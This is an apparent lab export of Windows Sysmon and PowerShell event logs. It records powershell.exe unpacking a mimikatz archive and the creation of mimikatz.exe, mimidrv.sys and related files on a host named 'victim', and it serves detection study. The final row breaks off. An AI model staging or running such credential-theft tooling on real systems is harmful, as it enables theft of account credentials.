"Oct 23, 2022 @ 01:51:42.784",K0XUAIQBHC0TB3lJh5xU,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","File created (rule: FileCreate)",file,11,"Oct 23, 2022 @ 01:51:44.669","Oct 23, 2022 @ 01:53:59.121",event,sysmon,"-","Microsoft-Windows-Sysmon","-",creation,"C:\Supertools\Mimikatz\Win32",dll,"mimilib.dll","C:\Supertools\Mimikatz\Win32\mimilib.dll","C:\Supertools\Mimikatz\Win32\mimilib.dll","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"File created:
RuleName: DLL
UtcTime: 2022-10-22 17:51:42.784
ProcessGuid: {461f0bd2-2da2-6354-8200-000000001f00}
ProcessId: 2628
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Supertools\Mimikatz\Win32\mimilib.dll
CreationUtcTime: 2022-10-22 17:51:42.784
User: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{461f0bd2-2da2-6354-8200-000000001f00}","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","-","powershell.exe","powershell.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",2628,"-","-","-","-","-","-","-","-","-","-","-","-","-","Patricia Goh",DLL,"-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"-","2022-10-22 17:51:42.784","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",11,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5155,"File created (rule: FileCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,2
"Oct 23, 2022 @ 01:51:42.784",LEXUAIQBHC0TB3lJh5xU,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","File created (rule: FileCreate)",file,11,"Oct 23, 2022 @ 01:51:44.669","Oct 23, 2022 @ 01:53:59.121",event,sysmon,"-","Microsoft-Windows-Sysmon","-",creation,"C:\Supertools\Mimikatz\Win32",exe,"mimilove.exe","C:\Supertools\Mimikatz\Win32\mimilove.exe","C:\Supertools\Mimikatz\Win32\mimilove.exe","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"File created:
RuleName: EXE
UtcTime: 2022-10-22 17:51:42.784
ProcessGuid: {461f0bd2-2da2-6354-8200-000000001f00}
ProcessId: 2628
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Supertools\Mimikatz\Win32\mimilove.exe
CreationUtcTime: 2022-10-22 17:51:42.784
User: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{461f0bd2-2da2-6354-8200-000000001f00}","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","-","powershell.exe","powershell.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",2628,"-","-","-","-","-","-","-","-","-","-","-","-","-","Patricia Goh",EXE,"-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"-","2022-10-22 17:51:42.784","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",11,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5156,"File created (rule: FileCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,2
"Oct 23, 2022 @ 01:51:42.784",LUXUAIQBHC0TB3lJh5xU,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","File created (rule: FileCreate)",file,11,"Oct 23, 2022 @ 01:51:44.669","Oct 23, 2022 @ 01:53:59.121",event,sysmon,"-","Microsoft-Windows-Sysmon","-",creation,"C:\Supertools\Mimikatz\Win32",dll,"mimispool.dll","C:\Supertools\Mimikatz\Win32\mimispool.dll","C:\Supertools\Mimikatz\Win32\mimispool.dll","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"File created:
RuleName: DLL
UtcTime: 2022-10-22 17:51:42.784
ProcessGuid: {461f0bd2-2da2-6354-8200-000000001f00}
ProcessId: 2628
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Supertools\Mimikatz\Win32\mimispool.dll
CreationUtcTime: 2022-10-22 17:51:42.784
User: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{461f0bd2-2da2-6354-8200-000000001f00}","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","-","powershell.exe","powershell.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",2628,"-","-","-","-","-","-","-","-","-","-","-","-","-","Patricia Goh",DLL,"-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"-","2022-10-22 17:51:42.784","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",11,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5157,"File created (rule: FileCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,2
"Oct 23, 2022 @ 01:51:42.667",KUXUAIQBHC0TB3lJh5xU,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","File created (rule: FileCreate)",file,11,"Oct 23, 2022 @ 01:51:44.669","Oct 23, 2022 @ 01:53:59.120",event,sysmon,"-","Microsoft-Windows-Sysmon","-",creation,"C:\Supertools\Mimikatz\Win32",sys,"mimidrv.sys","C:\Supertools\Mimikatz\Win32\mimidrv.sys","C:\Supertools\Mimikatz\Win32\mimidrv.sys","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"File created:
RuleName: -
UtcTime: 2022-10-22 17:51:42.667
ProcessGuid: {461f0bd2-2da2-6354-8200-000000001f00}
ProcessId: 2628
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Supertools\Mimikatz\Win32\mimidrv.sys
CreationUtcTime: 2022-10-22 17:51:42.667
User: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{461f0bd2-2da2-6354-8200-000000001f00}","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","-","powershell.exe","powershell.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",2628,"-","-","-","-","-","-","-","-","-","-","-","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"-","2022-10-22 17:51:42.667","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",11,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5153,"File created (rule: FileCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,2
"Oct 23, 2022 @ 01:51:42.667",KkXUAIQBHC0TB3lJh5xU,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","File created (rule: FileCreate)",file,11,"Oct 23, 2022 @ 01:51:44.669","Oct 23, 2022 @ 01:53:59.121",event,sysmon,"-","Microsoft-Windows-Sysmon","-",creation,"C:\Supertools\Mimikatz\Win32",exe,"mimikatz.exe","C:\Supertools\Mimikatz\Win32\mimikatz.exe","C:\Supertools\Mimikatz\Win32\mimikatz.exe","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"File created:
RuleName: EXE
UtcTime: 2022-10-22 17:51:42.667
ProcessGuid: {461f0bd2-2da2-6354-8200-000000001f00}
ProcessId: 2628
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Supertools\Mimikatz\Win32\mimikatz.exe
CreationUtcTime: 2022-10-22 17:51:42.667
User: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{461f0bd2-2da2-6354-8200-000000001f00}","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","-","powershell.exe","powershell.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",2628,"-","-","-","-","-","-","-","-","-","-","-","-","-","Patricia Goh",EXE,"-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"-","2022-10-22 17:51:42.667","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",11,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5154,"File created (rule: FileCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,2
"Oct 23, 2022 @ 01:51:41.681",J0XUAIQBHC0TB3lJh5xU,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Executing Pipeline",process,4103,"Oct 23, 2022 @ 01:51:43.210","Oct 23, 2022 @ 01:53:59.119",event,powershell,"-","Microsoft-Windows-PowerShell",18,info,"C:\Windows\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.Archive",psm1,"Microsoft.PowerShell.Archive.psm1","C:\Windows\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.Archive\Microsoft.PowerShell.Archive.psm1","C:\Windows\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.Archive\Microsoft.PowerShell.Archive.psm1","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"CommandInvocation(Add-Type): ""Add-Type""
ParameterBinding(Add-Type): name=""AssemblyName""; value=""System.IO.Compression.FileSystem""


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.19041.1682
        Host ID = 9fc6c888-24e2-4626-aaf7-b1a96b528fca
        Host Application = powershell.exe -command Expand-Archive -Force 'C:\Supertools\mimikatz.zip' 'C:\Supertools\Mimikatz'
        Engine Version = 5.1.19041.1682
        Runspace ID = 799bc253-5e67-4e4c-a5f8-ca2c7675c0b1
        Pipeline ID = 1
        Command Name = Add-Type
        Command Type = Cmdlet
        Script Name = C:\Windows\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.Archive\Microsoft.PowerShell.Archive.psm1
        Command Path = 
        Sequence Number = 18
        User = VICTIM\Patricia Goh
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:","-","""AssemblyName""","Add-Type, Add-Type","CommandInvocation, ParameterBinding","""Add-Type"", ""System.IO.Compression.FileSystem""","Add-Type",Cmdlet,"5.1.19041.1682","Microsoft.PowerShell",1,"5.1.19041.1682","799bc253-5e67-4e4c-a5f8-ca2c7675c0b1","powershell.exe, -command, Expand-Archive, -Force, 'C:\Supertools\mimikatz.zip', 'C:\Supertools\Mimikatz'",6,"powershell.exe -command Expand-Archive -Force 'C:\Supertools\mimikatz.zip' 'C:\Supertools\Mimikatz'","powershell.exe -command Expand-Archive -Force 'C:\Supertools\mimikatz.zip' 'C:\Supertools\Mimikatz'","9fc6c888-24e2-4626-aaf7-b1a96b528fca","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",ConsoleHost,ConsoleHost,"-","-","-","-","-","-","-","-","-","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-21-2122377032-2002226406-4116515985-1002","Patricia Goh","Patricia Goh","{6f31b3cd-e63e-0001-50be-316f3ee6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",victim,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4103,"-","-","To be used when operation is just executing a method","2,628","1,620","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",2372,"Executing Pipeline",VICTIM,"S-1-5-21-2122377032-2002226406-4116515985-1002","Patricia Goh",User,1
"Oct 23, 2022 @ 01:51:41.669",JkXUAIQBHC0TB3lJh5xU,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Executing Pipeline",process,4103,"Oct 23, 2022 @ 01:51:43.210","Oct 23, 2022 @ 01:53:59.118",event,powershell,"-","Microsoft-Windows-PowerShell",16,info,"C:\Windows\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.Archive",psm1,"Microsoft.PowerShell.Archive.psm1","C:\Windows\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.Archive\Microsoft.PowerShell.Archive.psm1","C:\Windows\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.Archive\Microsoft.PowerShell.Archive.psm1","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"CommandInvocation(Add-Type): ""Add-Type""
ParameterBinding(Add-Type): name=""AssemblyName""; value=""System.IO.Compression""


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.19041.1682
        Host ID = 9fc6c888-24e2-4626-aaf7-b1a96b528fca
        Host Application = powershell.exe -command Expand-Archive -Force 'C:\Supertools\mimikatz.zip' 'C:\Supertools\Mimikatz'
        Engine Version = 5.1.19041.1682
        Runspace ID = 799bc253-5e67-4e4c-a5f8-ca2c7675c0b1
        Pipeline ID = 1
        Command Name = Add-Type
        Command Type = Cmdlet
        Script Name = C:\Windows\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.Archive\Microsoft.PowerShell.Archive.psm1
        Command Path = 
        Sequence Number = 16
        User = VICTIM\Patricia Goh
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:","-","""AssemblyName""","Add-Type, Add-Type","CommandInvocation, ParameterBinding","""Add-Type"", ""System.IO.Compression""","Add-Type",Cmdlet,"5.1.19041.1682","Microsoft.PowerShell",1,"5.1.19041.1682","799bc253-5e67-4e4c-a5f8-ca2c7675c0b1","powershell.exe, -command, Expand-Archive, -Force, 'C:\Supertools\mimikatz.zip', 'C:\Supertools\Mimikatz'",6,"powershell.exe -command Expand-Archive -Force 'C:\Supertools\mimikatz.zip' 'C:\Supertools\Mimikatz'","powershell.exe -command Expand-Archive -Force 'C:\Supertools\mimikatz.zip' 'C:\Supertools\Mimikatz'","9fc6c888-24e2-4626-aaf7-b1a96b528fca","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",ConsoleHost,ConsoleHost,"-","-","-","-","-","-","-","-","-","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-21-2122377032-2002226406-4116515985-1002","Patricia Goh","Patricia Goh","{6f31b3cd-e63e-0000-16bb-316f3ee6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",victim,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4103,"-","-","To be used when operation is just executing a method","2,628","1,620","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",2371,"Executing Pipeline",VICTIM,"S-1-5-21-2122377032-2002226406-4116515985-1002","Patricia Goh",User,1
"Oct 23, 2022 @ 01:51:39.837",IUXUAIQBHC0TB3lJgpz3,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:51:41.551","Oct 23, 2022 @ 01:53:58.001",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:51:39.837
ProcessGuid: {461f0bd2-2dab-6354-8400-000000001f00}
ProcessId: 4888
Image: C:\Windows\System32\taskhostw.exe
FileVersion: 10.0.19041.1865 (WinBuild.160101.0800)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhostw.exe
CommandLine: taskhostw.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {461f0bd2-2cdb-6354-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=A00BF82660835224CD6606A248321C5D,SHA256=E63709209D09BC0247E785F075DDB28A98C348206109E2B8BA321AD958402728,IMPHASH=3A0C6863CDE566AF997DB2DEFFF9D924
ParentProcessGuid: {461f0bd2-2cdc-6354-1300-000000001f00}
ParentProcessId: 432
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p
ParentUser: NT AUTHORITY\SYSTEM","-","-","-","-","-","-","-","-","-","-","-","-","taskhostw.exe",1,"taskhostw.exe","taskhostw.exe","{461f0bd2-2dab-6354-8400-000000001f00}","C:\Windows\System32\taskhostw.exe","C:\Windows\System32\taskhostw.exe",a00bf82660835224cd6606a248321c5d,e63709209d09bc0247e785f075ddb28a98c348206109e2b8ba321ad958402728,"taskhostw.exe","taskhostw.exe","C:\Windows\system32\svchost.exe, -k, netsvcs, -p",4,"C:\Windows\system32\svchost.exe -k netsvcs -p","C:\Windows\system32\svchost.exe -k netsvcs -p","{461f0bd2-2cdc-6354-1300-000000001f00}","C:\Windows\System32\svchost.exe","C:\Windows\System32\svchost.exe","svchost.exe","svchost.exe",432,"Microsoft Corporation","Host Process for Windows Tasks","10.0.19041.1865 (WinBuild.160101.0800)",3a0c6863cde566af997db2defff9d924,"taskhostw.exe","Microsoft® Windows® Operating System",4888,"-","-","C:\Windows\system32\","C:\Windows\system32\","-","-","-","-","-","-","e63709209d09bc0247e785f075ddb28a98c348206109e2b8ba321ad958402728, a00bf82660835224cd6606a248321c5d, 3a0c6863cde566af997db2defff9d924","-","-",SYSTEM,"-","-","NT AUTHORITY","-","S-1-5-18",SYSTEM,SYSTEM,"-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","Host Process for Windows Tasks","-","10.0.19041.1865 (WinBuild.160101.0800)",System,"{461f0bd2-2cdb-6354-e703-000000000000}",0x3e7,"-","NT AUTHORITY\SYSTEM","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",0,"-",1,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5152,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:51:36.525",IEXUAIQBHC0TB3lJepz0,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","File created (rule: FileCreate)",file,11,"Oct 23, 2022 @ 01:51:38.486","Oct 23, 2022 @ 01:53:55.956",event,sysmon,"-","Microsoft-Windows-Sysmon","-",creation,"C:\Users\Patricia Goh\AppData\Local\Temp",ps1,"__PSScriptPolicyTest_jagpt0da.3qs.ps1","C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_jagpt0da.3qs.ps1","C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_jagpt0da.3qs.ps1","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"File created:
RuleName: -
UtcTime: 2022-10-22 17:51:36.525
ProcessGuid: {461f0bd2-2da2-6354-8200-000000001f00}
ProcessId: 2628
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_jagpt0da.3qs.ps1
CreationUtcTime: 2022-10-22 17:51:36.525
User: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{461f0bd2-2da2-6354-8200-000000001f00}","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","-","powershell.exe","powershell.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",2628,"-","-","-","-","-","-","-","-","-","-","-","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"-","2022-10-22 17:51:36.525","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",11,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5151,"File created (rule: FileCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,2
"Oct 23, 2022 @ 01:51:31.139",F0XUAIQBHC0TB3lJb5wG,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","File created (rule: FileCreate)",file,11,"Oct 23, 2022 @ 01:51:33.860","Oct 23, 2022 @ 01:53:52.900",event,sysmon,"-","Microsoft-Windows-Sysmon","-",creation,"C:\Users\Patricia Goh\AppData\Local\Temp",ps1,"__PSScriptPolicyTest_p4tfxsga.3gn.ps1","C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_p4tfxsga.3gn.ps1","C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_p4tfxsga.3gn.ps1","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"File created:
RuleName: -
UtcTime: 2022-10-22 17:51:31.139
ProcessGuid: {461f0bd2-2da2-6354-8200-000000001f00}
ProcessId: 2628
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_p4tfxsga.3gn.ps1
CreationUtcTime: 2022-10-22 17:51:31.139
User: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{461f0bd2-2da2-6354-8200-000000001f00}","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","-","powershell.exe","powershell.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",2628,"-","-","-","-","-","-","-","-","-","-","-","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"-","2022-10-22 17:51:31.139","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",11,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5149,"File created (rule: FileCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,2
"Oct 23, 2022 @ 01:51:30.496",FkXUAIQBHC0TB3lJapyU,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:51:32.187","Oct 23, 2022 @ 01:53:51.764",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:51:30.496
ProcessGuid: {461f0bd2-2da2-6354-8200-000000001f00}
ProcessId: 2628
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.546 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe  -command ""Expand-Archive -Force 'C:\Supertools\mimikatz.zip' 'C:\Supertools\Mimikatz'""
CurrentDirectory: C:\Users\PATRIC~1\AppData\Local\Temp\IXP000.TMP\
User: VICTIM\Patricia Goh
LogonGuid: {461f0bd2-2d0d-6354-ef2b-030000000000}
LogonId: 0x32BEF
